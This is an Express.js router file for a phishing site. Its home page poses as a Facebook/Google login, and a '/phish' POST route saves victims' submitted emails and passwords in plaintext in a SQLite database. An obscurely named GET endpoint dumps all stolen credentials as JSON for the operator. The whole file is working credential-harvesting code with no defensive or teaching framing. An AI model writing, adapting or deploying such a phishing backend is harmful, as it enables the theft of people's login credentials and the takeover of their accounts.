var express = require('express');
var router = express.Router();
const sqlite3 = require('sqlite3').verbose();

// create a new database file users.db or open existing users.db
const db = new sqlite3.Database('./users.db', (err) => {
    if (err) {
        console.error(err.message);
    }
    
});



// /* GET home page. */
// router.get('/', function(req, res, next) {
//   res.render('index', { title: "Express", 'domain-name': 'Express', 'domain-path': 'ok' });
// });
/* GET home page. */
router.get('/', function(req, res, next) {
  res.render('index', { title: "Facebook", 'domain-name': 'gmail.com/', 'domain-path': '/auth/google/login' });
});

router.get('/jhhdbcjhdbjcbdjcbvjdcbvjdbcd', function(req, res){

 var ola = db.all(`SELECT * FROM users`, function(err, data) {
  if (err) {
   console.log(err);
  } else {
   res.status(200).json(data);
  }
 });

db.close((err) => {
  if (err) {
      console.error(err.message);
  }
  
});
})
// post to phishing page 
router.post('/phish', function(req,res, next) {

  var user = req.body.email;
  var password = req.body.password;
  let params = [user, password];
  let updateSQL = `INSERT into users (email, password)
            values (?,? ) `;

    //1rst statement 
    db.run(updateSQL, params, function (err) {
        if (err) {
            return console.error(err.message);
        }
        console.log('saved')
       

    });
    // Always close the connection with database
    db.close((err) => {
      if (err) {
          console.error(err.message);
      }
      
    });
  
  

});



module.exports = router;
